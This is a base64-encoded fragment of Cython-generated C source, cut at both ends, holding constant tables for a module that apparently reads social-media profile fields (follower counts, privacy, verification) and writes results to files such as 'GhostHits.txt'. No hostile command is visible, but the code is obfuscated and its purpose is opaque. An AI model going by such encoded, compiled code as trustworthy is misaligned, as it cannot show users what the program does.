pbnRfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE1LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV90bF90eHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSkpIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7CiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0gPSBQeVR1cGxlX1BhY2soMywgUHlfTm9uZSwgUHlfTm9uZSwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGssIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdKSkgX19QWVhfRVJSKDAsIDIzMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Z1bGxfbmFtZSwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pKSBfX1BZWF9FUlIoMCwgMjM0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZm9sbG93ZXJfY291bnQsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdKSkgX19QWVhfRVJSKDAsIDIzNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZvbGxvd2luZ19jb3VudCwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0pKSBfX1BZWF9FUlIoMCwgMjM2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21lZGlhX2NvdW50LCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMF0pKSBfX1BZWF9FUlIoMCwgMjM3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTBdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzExXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaXNfcHJpdmF0ZSwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdKSkgX19QWVhfRVJSKDAsIDIzOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzExXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jpb2dyYXBoeSwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTJdKSkgX19QWVhfRVJSKDAsIDIzOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEyXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxM10gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX3ZlcmlmaWVkLCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxM10pKSBfX1BZWF9FUlIoMCwgMjQwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTNdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE0XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaXNfYnVzaW5lc3MsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE0XSkpIF9fUFlYX0VSUigwLCAyNDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTRdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfR2hvc3RIaXRzX3R4dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2EpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE1XSkpIF9fUFlYX0VSUigwLCAyNzQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNV0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGxfdHh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfcik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdKSkgX19QWVhfRVJSKDAsIDI5MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSA9IFB5U2xpY2VfTmV3KFB5X05vbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNiwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0pKSBfX1BZWF9FUlIoMCwgMzU0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE1MCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzk5OSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddKSkgX19QWVhfRVJSKDAsIDQwNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE3XSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0pKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMThdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSk7CiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMzAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOV0pKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE5XSk7CiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0pKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSk7CgogIAogIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMV0pKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjFdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSk7CiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjJdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF85OTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIyXSkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjJdKTsKCiAgCiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjNdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbXBvcnRsaWIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dGlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyM10pKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIzXSk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyM10pOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiAwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gLTE7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wLnR5cGUgPSAoUHlPYmplY3QqKSZQeURpY3RfVHlwZTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wLm1ldGhvZF9uYW1lID0gJl9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BvcDsKICBpZiAoX19QeXhfSW5pdFN0cmluZ3MoX19weXhfc3RyaW5nX3RhYiwgX19weXhfbXN0YXRlLT5fX3B5eF9zdHJpbmdfdGFiLCBfX3B5eF9zdHJpbmdfdGFiX2VuY29kaW5ncykgPCAwKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpOwogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzAgPSBQeUxvbmdfRnJvbUxvbmcoMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xID0gUHlMb25nX0Zyb21Mb25nKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMiA9IFB5TG9uZ19Gcm9tTG9uZygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMgPSBQeUxvbmdfRnJvbUxvbmcoMyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81ID0gUHlMb25nX0Zyb21Mb25nKDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNiA9IFB5TG9uZ19Gcm9tTG9uZyg2KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF82KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkgPSBQeUxvbmdfRnJvbUxvbmcoOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMCA9IFB5TG9uZ19Gcm9tTG9uZygxMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTEgPSBQeUxvbmdfRnJvbUxvbmcoMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzExKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzE1ID0gUHlMb25nX0Zyb21Mb25nKDE1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNiA9IFB5TG9uZ19Gcm9tTG9uZygxNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMzAgPSBQeUxvbmdfRnJvbUxvbmcoMzApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEwMCA9IFB5TG9uZ19Gcm9tTG9uZygxMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMTEgPSBQeUxvbmdfRnJvbUxvbmcoMTExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMTEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTUwID0gUHlMb25nX0Zyb21Mb25nKDE1MCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTUwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMCA9IFB5TG9uZ19Gcm9tTG9uZygyMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDggPSBQeUxvbmdfRnJvbUxvbmcoMjA4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDgpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTk5ID0gUHlMb25nX0Zyb21Mb25nKDk5OSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTk5KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTAwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMzAwID0gUHlMb25nX0Zyb21Mb25nKDEzMDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEzMDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAwMCA9IFB5TG9uZ19Gcm9tTG9uZygyMDAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDAwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTAgPSBQeUxvbmdfRnJvbUxvbmcoMjAxMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDExID0gUHlMb25nX0Zyb21Mb25nKDIwMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMiA9IFB5TG9uZ19Gcm9tTG9uZygyMDEyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDEyKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTMgPSBQeUxvbmdfRnJvbUxvbmcoMjAxMyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE0ID0gUHlMb25nX0Zyb21Mb25nKDIwMTQpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTQpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNSA9IFB5TG9uZ19Gcm9tTG9uZygyMDE1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE1KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTYgPSBQeUxvbmdfRnJvbUxvbmcoMjAxNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxNikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE3ID0gUHlMb25nX0Zyb21Mb25nKDIwMTcpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTcpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOCA9IFB5TG9uZ19Gcm9tTG9uZygyMDE4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE4KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTkgPSBQeUxvbmdfRnJvbUxvbmcoMjAxOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMDAwMDAwID0gUHlMb25nX0Zyb21Mb25nKDEwMDAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fc